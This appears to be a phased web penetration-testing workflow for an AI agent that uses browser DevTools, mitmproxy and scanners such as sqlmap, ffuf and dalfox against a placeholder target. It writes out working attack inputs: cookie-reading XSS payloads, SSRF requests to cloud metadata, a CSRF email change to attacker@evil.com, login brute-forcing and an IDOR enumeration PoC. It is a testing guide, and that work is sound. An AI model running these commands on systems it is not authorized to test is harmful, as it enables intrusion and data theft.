# Web RE Workflow

## Goals

This workflow exists to turn web security testing sessions into short,
evidence-backed loops instead of random tool spraying.

Primary outputs per target:

- target URL and defined scope
- technology stack identification
- endpoints and API surface discovered
- authentication and session management analysis
- proxy result: visible traffic / TLS issues / WAF blocking / bypass needed
- chrome-devtools result: pages mapped / JS discovered / network captured
- vulnerabilities found with OWASP Top 10 classification
- PoC scripts for every confirmed finding
- next best action with proof

## Core Proof Loop

Inside every phase, repeat this loop:

1. state the current hypothesis
2. run the smallest proof step that could falsify it
3. capture exact evidence
4. **write the result to the workspace file immediately** — do not hold it in
   memory for later
5. either escalate, pivot, or kill the branch

Do not advance phases just because a tool succeeded. Advance because a question
was answered with evidence.

**Critical: context compaction can erase earlier discoveries at any time.**
Every endpoint, vulnerability, finding, screenshot, and test result must be
written to the workspace file immediately after capture. Never batch writes.

## Phase 0: Environment Validation

Run:

```bash
bash scripts/ai/web-re/web-re.sh doctor
bash scripts/ai/web-re/web-re.sh status
```

Confirm:

- Chrome is running with DevTools Protocol on port 9222
- chrome-devtools MCP is connected and responsive
- `mitmproxy`, `mitmdump`, `curl`, `httpie`, `nuclei`, `sqlmap`, `dalfox`,
  `ffuf`, `arjun`, `subfinder`, `amass`, `httpx`, `katana`, `whatweb`,
  `nmap`
- mitmproxy CA cert exists and is trusted
- tmux session `web-re` exists with `mitm`, `proxy`, `logs`, `recon`

If this is a new target, initialize the workspace:

```bash
bash scripts/ai/web-re/workspace-init.sh init example.target.com
```

If resuming, read workspace state first:

```bash
cat ~/Documents/example.target.com/SESSIONS.md
cat ~/Documents/example.target.com/NOTES.md
cat ~/Documents/example.target.com/FINDINGS.md
cat ~/Documents/example.target.com/ENDPOINTS.md
```

If any baseline check fails, stop and use `TROUBLESHOOTING.md` before touching
the target.

## Phase 1: Target Intake

Before scanning or testing, identify the target precisely.

Define scope:

- target URL (e.g., `https://example.target.com`)
- scope boundaries (specific paths, subdomains, or full domain)
- any exclusion rules provided by the operator
- testing authorization confirmation

Technology fingerprint:

```bash
whatweb https://example.target.com -v
curl -sI https://example.target.com | head -30
httpx -u https://example.target.com -silent -tech-detect -status-code -title
```

Capture:

- server software and version
- framework identification (Rails, Django, Express, Spring, Laravel, etc.)
- programming language hints
- CMS or platform identification
- CDN or WAF indicators
- TLS configuration

Record in workspace:

```bash
echo "## Tech Stack" > ~/Documents/example.target.com/TECH-STACK.md
echo "- Server: nginx/1.24" >> ~/Documents/example.target.com/TECH-STACK.md
echo "- Framework: Express.js" >> ~/Documents/example.target.com/TECH-STACK.md
echo "- CDN: Cloudflare" >> ~/Documents/example.target.com/TECH-STACK.md
```

Pivot rule:

- if the tech stack suggests specific vulnerability classes (e.g., PHP app ->
  file inclusion, Laravel -> mass assignment, Express -> prototype pollution),
  prioritize those in later phases.

## Phase 2: Reconnaissance

Discover the target's external surface before touching the application itself.

**Write each discovery to workspace files as you find it — do not wait until
reconnaissance is complete:**

- found a subdomain → append to `ENDPOINTS.md` now
- found a live host → note it in `NOTES.md` now
- found an open port → record it in `ATTACK-SURFACE.md` now
- found an interesting header → note in `TECH-STACK.md` now

### Subdomain enumeration

```bash
subfinder -d example.target.com -silent | tee /tmp/subdomains.txt
amass enum -passive -d example.target.com -silent | tee -a /tmp/subdomains.txt
sort -u /tmp/subdomains.txt -o /tmp/subdomains.txt
```

### Live host probing

```bash
httpx -l /tmp/subdomains.txt -silent -status-code -title -tech-detect -o /tmp/live-hosts.txt
cat /tmp/live-hosts.txt
```

### URL and endpoint discovery

```bash
katana -u https://example.target.com -silent -jc -d 5 -o /tmp/discovered-urls.txt
cat /tmp/discovered-urls.txt | sort -u
```

### Port scanning (target host only)

```bash
nmap -sV -sC -p 80,443,8080,8443,3000,5000,9000 example.target.com -oN /tmp/nmap.txt
```

Reconnaissance questions:

1. How many subdomains exist? Which are alive?
2. What technologies are running on each?
3. How many unique URL paths were discovered?
4. Are there development/staging environments exposed?
5. Are there non-standard ports running web services?

Pivot rule:

- if reconnaissance reveals development/staging environments, test those first
  — they often have weaker security controls.

## Phase 3: Application Mapping

Use chrome-devtools MCP as the primary tool to map the entire application
surface. This is the most important phase — it determines what you test later.

### Navigate the main page

```
navigate_page to https://example.target.com
take_snapshot
take_screenshot — save to ~/Documents/{target}/evidence/screenshots/01-homepage.png
list_network_requests — capture initial API calls
list_console_messages — check for errors and information leaks
```

### Map every page and link

For each page discovered:

1. `navigate_page` to the URL
2. `take_snapshot` — read full DOM structure, identify forms, links, and
   interactive elements
3. `take_screenshot` — capture visual evidence
4. `list_network_requests` — see what API calls the page makes
5. `list_console_messages` — check for errors, debug info, exposed variables
6. Click every link and button, one at a time, snapshotting after each action
7. Fill every form with test data
8. Record every discovered endpoint in `ENDPOINTS.md`
9. Save screenshots to `~/Documents/{target}/evidence/screenshots/`

### Discover JavaScript files and API calls

```
evaluate_script "Array.from(document.querySelectorAll('script[src]')).map(s => s.src)"
evaluate_script "Object.keys(window).filter(k => typeof window[k] === 'function' && window[k].toString().includes('fetch'))"
list_network_requests — look for XHR/fetch calls to API endpoints
```

### Map forms and inputs

For each form on each page:

```
take_snapshot — identify form elements
fill each input with test values
click submit
take_snapshot — check response
list_network_requests — capture the form submission request
get_network_request — inspect full request/response
```

### Build the endpoint map

Record in `ENDPOINTS.md`:

```markdown
## API Endpoints

### GET /api/users

- Auth required: yes (Bearer token)
- Parameters: page, limit, search
- Response: JSON array of user objects
- Notes: returns email and phone number in response

### POST /api/users/login

- Auth required: no
- Parameters: email, password
- Response: JSON with JWT token and refresh token
- Notes: no rate limiting observed

### GET /api/admin/dashboard

- Auth required: unknown
- Response: 403 Forbidden (check for auth bypass)
```

Pivot rule:

- if mapping reveals admin endpoints, API routes without visible auth checks,
  or forms that submit to interesting backends, prioritize those in vulnerability
  testing.

## Phase 4: Traffic Interception

Set up mitmproxy to capture and analyze all HTTP(S) traffic.

### Start mitmproxy

```bash
bash scripts/ai/web-re/web-re.sh mitm-start
```

### Configure proxy

Route browser traffic through mitmproxy:

```bash
bash scripts/ai/web-re/web-re.sh start-chrome --proxy
```

Or configure proxy in existing Chrome session via chrome-devtools (if supported).

### Read captured traffic

```bash
tmux capture-pane -t web-re:mitm -p -S -300
tmux capture-pane -t web-re:mitm -p -S -300 | grep -oP '(?:GET|POST|PUT|DELETE|PATCH|HEAD) https?://[^ ]+' | sort -u
tmux capture-pane -t web-re:mitm -p -S -300 | grep -iE 'authorization|bearer|x-api-key|token|cookie|set-cookie'
```

### Analyze request/response patterns

For each captured request:

1. note the endpoint and HTTP method
2. check for authentication tokens in headers
3. check for session cookies
4. inspect response for sensitive data
5. check for unusual headers or server behavior
6. record in `ENDPOINTS.md`

Interpretation:

- visible decrypted traffic -> interception works
- `Client TLS handshake failed` -> certificate pinning or trust issue
- no traffic at all -> proxy not configured correctly
- `403` with WAF messages -> web application firewall active

Pivot rule:

- if traffic interception reveals authentication tokens, session cookies, or
  API keys, move immediately to authentication testing.

## Phase 5: Authentication Testing

Test the target's authentication and session management mechanisms.

### Login flow analysis

```
navigate_page to https://example.target.com/login
take_snapshot
fill username/email input with "test@example.com"
fill password input with "testpassword123"
click submit button
take_snapshot — check login result
list_network_requests — capture the authentication request
get_network_request — inspect full login request/response
```

### Token analysis

```bash
# Decode JWT tokens
python3 -c "import jwt,sys; t=sys.argv[1]; print(jwt.decode(t,options={'verify_signature':False}))" "eyJ..."

# Check token structure
echo "eyJ..." | cut -d. -f1 | base64 -d 2>/dev/null | jq .
echo "eyJ..." | cut -d. -f2 | base64 -d 2>/dev/null | jq .
```

Test for:

- JWT algorithm confusion (`none`, RS256 vs HS256)
- Token expiration enforcement
- Token replay across sessions
- Refresh token handling
- Password reset flow security
- Session fixation
- Missing or weak MFA bypass
- OAuth implementation flaws

### Session management testing

```bash
# Check cookie flags
curl -sI "https://example.target.com/login" | grep -i set-cookie
# Look for: HttpOnly, Secure, SameSite flags

# Test session fixation
# 1. Get a session cookie before login
# 2. Login
# 3. Check if the session cookie changed
# 4. If unchanged, session fixation may be possible

# Test concurrent sessions
# Login from two "browsers" and check if both sessions remain valid
```

### Brute force testing

```bash
# Test if login is rate-limited
for i in $(seq 1 20); do
  curl -s -X POST "https://example.target.com/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@example.com","password":"wrong'$i'"}' \
    -w "\nHTTP %{http_code}\n"
done
```

Pivot rule:

- if authentication tokens are predictable, lack expiration, or can be forged,
  move immediately to authorization testing and privilege escalation.

## Phase 6: Vulnerability Testing

Test for OWASP Top 10 vulnerabilities systematically.

### XSS testing

```bash
# Reflected XSS
dalfox url "https://example.target.com/search?q=test" --blind https://your-callback.url

# Manual testing with chrome-devtools
navigate_page to https://example.target.com/search?q=<script>alert(1)</script>
take_snapshot — check if payload is reflected unescaped
list_console_messages — check for XSS execution

# Stored XSS via forms
navigate_page to https://example.target.com/comment
take_snapshot
fill comment input with <img src=x onerror=alert(document.cookie)>
click submit
navigate_page to page rendering comments
take_snapshot — check if payload rendered
```

### SQL injection

```bash
# Automated detection
sqlmap -u "https://example.target.com/api/users?id=1" --batch --level 3

# Test specific endpoints
sqlmap -u "https://example.target.com/api/search" --data="q=test" --batch
sqlmap -u "https://example.target.com/api/login" --data="email=test@test.com&password=test" --batch
```

### IDOR testing

```bash
# Enumerate object IDs
for i in $(seq 1 20); do
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://example.target.com/api/users/$i" | jq '{id, email, name}' 2>/dev/null
done

# Test different object types
curl -s -H "Authorization: Bearer $TOKEN" "https://example.target.com/api/orders/1"
curl -s -H "Authorization: Bearer $TOKEN" "https://example.target.com/api/documents/1"
```

### SSRF testing

```bash
# Test URL parameters for SSRF
curl -s "https://example.target.com/fetch?url=http://127.0.0.1:80/admin"
curl -s "https://example.target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://example.target.com/fetch?url=http://localhost:22/"
```

### CSRF testing

```bash
# Test if state-changing requests require CSRF tokens
curl -s -X POST "https://example.target.com/api/change-email" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=abc123" \
  -d '{"email":"attacker@evil.com"}'
# If successful without CSRF token, vulnerability confirmed
```

### CORS testing

```bash
# Test CORS headers with various origins
curl -s -H "Origin: https://evil.com" -I "https://example.target.com/api/data"
curl -s -H "Origin: null" -I "https://example.target.com/api/data"
curl -s -H "Origin: https://sub.example.target.com" -I "https://example.target.com/api/data"
```

Pivot rule:

- for every confirmed vulnerability, write a PoC script and add to
  `FINDINGS.md` immediately. Do not wait until the end of the phase.

## Phase 7: API Testing

Test API endpoints systematically, parameter by parameter.

### Parameter discovery

```bash
# Discover hidden parameters
arjun -u "https://example.target.com/api/users" -m GET
arjun -u "https://example.target.com/api/users" -m POST
arjun -u "https://example.target.com/api/search" -m GET
```

### Endpoint fuzzing

```bash
# Directory and file fuzzing
ffuf -u https://example.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,401,403

# API route fuzzing
ffuf -u https://example.target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,401,403

# Parameter fuzzing
ffuf -u "https://example.target.com/api/users?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200
```

### Test each endpoint

For every endpoint discovered in mapping:

1. test without authentication — does it return data?
2. test with authentication — what data is accessible?
3. test parameter manipulation — can you access other users' data?
4. test input validation — what happens with malformed input?
5. test HTTP method switching — does GET work where only POST should?
6. test content-type switching — what happens with different content types?
7. record every test result in `ENDPOINTS.md`

### GraphQL testing (if detected)

```bash
# Introspection query
curl -s -X POST "https://example.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}' | jq .

# Test for unauthorized access
curl -s -X POST "https://example.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{users{id,email,password}}"}' | jq .
```

Pivot rule:

- if endpoint testing reveals authentication or authorization issues on specific
  routes, focus exploitation there before moving to broader testing.

## Phase 8: Client-Side Analysis

Analyze the client-side code for security issues.

### JavaScript source maps and source code

```
# Check for source maps
evaluate_script "performance.getEntriesByType('resource').filter(r => r.name.endsWith('.map')).map(r => r.name)"

# Check for exposed globals and config
evaluate_script "Object.keys(window).filter(k => k.includes('config') || k.includes('api') || k.includes('key'))"

# Check for hardcoded secrets in JS
evaluate_script "document.documentElement.innerHTML.match(/['\"][a-zA-Z0-9]{32,}['\"]/g)"
```

### localStorage and cookies

```
evaluate_script "JSON.stringify(localStorage)"
evaluate_script "document.cookie"
evaluate_script "JSON.stringify(sessionStorage)"
```

Check for:

- tokens stored in localStorage (vulnerable to XSS)
- sensitive data in cookies without HttpOnly flag
- session identifiers in localStorage or sessionStorage
- API keys or secrets embedded in client-side code

### Content Security Policy

```
# Check CSP header
curl -sI "https://example.target.com" | grep -i "content-security-policy"

# Check meta tag CSP
evaluate_script "document.querySelector('meta[http-equiv=Content-Security-Policy]')?.content"
```

Assess:

- is the CSP restrictive enough to prevent XSS exploitation?
- are there `unsafe-inline` or `unsafe-eval` directives?
- are there overly permissive `script-src` or `connect-src` values?

### Subresource Integrity

```
# Check for SRI on external scripts
evaluate_script "Array.from(document.querySelectorAll('script[src]')).map(s => ({src: s.src, integrity: s.integrity}))"
```

Pivot rule:

- if client-side analysis reveals XSS-vulnerable patterns (tokens in
  localStorage, weak CSP), prioritize XSS exploitation.

## Phase 9: Confidence and Chaining Review

Before ending the session, classify each finding as:

- `proven`
- `likely`
- `suspected`
- `blocked`

Then ask:

- what is the strongest attacker-usable primitive I proved?
- what trust boundary did it cross?
- what does it unlock next?
- can findings be chained? (e.g., XSS to steal token from localStorage, then
  token to access admin API, then admin API to extract all user data)
- what is the next best operator action if the session continues?

## Phase 10: Report and POC

### Update all workspace files

Ensure all workspace files are complete and up-to-date:

- `FINDINGS.md` — every vulnerability classified by OWASP Top 10
- `ENDPOINTS.md` — every discovered endpoint with parameters and auth status
- `ATTACK-SURFACE.md` — complete attack surface map
- `TECH-STACK.md` — all identified technologies with versions
- `NOTES.md` — hypotheses, blocked items, and next steps
- `SESSIONS.md` — session summary with goals, findings, blockers, next steps

### Write PoC scripts

For every confirmed finding, create a PoC script in `scripts/`:

```python
#!/usr/bin/env python3
"""
PoC: IDOR on /api/users/{id}
OWASP: A01 Broken Access Control
Confidence: proven
"""
import requests
import sys

token = sys.argv[1] if len(sys.argv) > 1 else "YOUR_TOKEN_HERE"

for user_id in range(1, 20):
    r = requests.get(
        f"https://example.target.com/api/users/{user_id}",
        headers={"Authorization": f"Bearer {token}"}
    )
    if r.status_code == 200:
        data = r.json()
        print(f"[+] User {user_id}: {data.get('email')} - {data.get('name')}")
```

### Session summary

Write a session summary to `SESSIONS.md`:

```markdown
## Session YYYY-MM-DD

### Goals

- Full security assessment of example.target.com

### Findings

- A01: IDOR on /api/users/{id} — proven
- A03: Reflected XSS on /search?q= — proven
- A05: Missing security headers — likely
- A07: No rate limiting on login — proven

### Blockers

- WAF blocks SQL injection payloads on /api/search
- Chrome DevTools intermittent disconnects

### Next Steps

- Test alternative SQLi bypass techniques
- Test admin endpoints for auth bypass
- Deep-dive client-side JS for hardcoded secrets
```
